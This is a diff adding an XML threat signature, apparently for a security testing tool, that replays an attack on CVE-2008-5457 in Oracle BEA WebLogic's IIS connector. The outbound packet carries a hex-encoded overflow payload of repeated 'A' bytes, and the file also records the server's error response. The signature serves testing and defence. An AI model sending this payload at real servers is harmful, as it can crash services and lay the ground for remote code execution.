@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Oracle BEA WebLogic IIS connector JSESSIONID Stack Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a buffer overflow vulnerability in BEA WebLogic Server IIS Connector. The vulnerability is due to a boundary error in the IIS connector. A remote unauthenticated attacker can exploit this vulnerability by sending crafted HTTP requests to the target host. In an attack case where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The injected code in such a case would execute within the security context of the IIS service. In an attack case where code injection is not successful, the affected process will terminate abnormally."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Oracle"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Oracle_BEA_WebLogic_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Oracle_BEA_WebLogic_Server_7.0_up_to_7.0_SP7&amp;8.1_up_to_8.1_SP6&amp;9.0&amp;9.1&amp;9.2_up_to_9.2_MP3&amp;10.0_up_to_10.0_MP1&amp;10.3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-5457"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="06b52cdb4dd38303e8dac8a27d8db6f5"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633989943041075860"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1263378603" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="Q"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="R"/>
+  </Variables>
+  <Loops>
+    <for index="I">
+      <for index="Q"/>
+      <for index="R"/>
+    </for>
+    <for index="K">
+      <for index="Q"/>
+      <for index="R"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="I" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:2B:96:F6" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="012C" Identification="9785" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="4031" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="43722" destPort="$HTTPdestPort" SeqNumber="CB4B3415" AckNumber="F7F4B99C" HeaderLength="08" WindowSize="002E" Checksum="C11B" UrgentPointer="0000" Options="0101080A1ECE8A0C00022567" Payload="4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414120485454502F312E300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="K" Count="">
+      <Ethernet srcMac="00:0C:29:2B:96:F6" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00BF" Identification="F23B" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="A5E7" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="43722" SeqNumber="F7F4B99C" AckNumber="CB4B350D" HeaderLength="08" WindowSize="FFFF" Checksum="9DEF" UrgentPointer="0000" Options="0101080A000225671ECE8A0B" Payload="485454502F312E312035303020536572766572204572726F720D0A5365727665723A204D6963726F736F66742D4949532F352E300D0A446174653A205765642C2030382041707220323030392030313A32373A303020474D540D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A436F6E74656E742D4C656E6774683A203131330D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
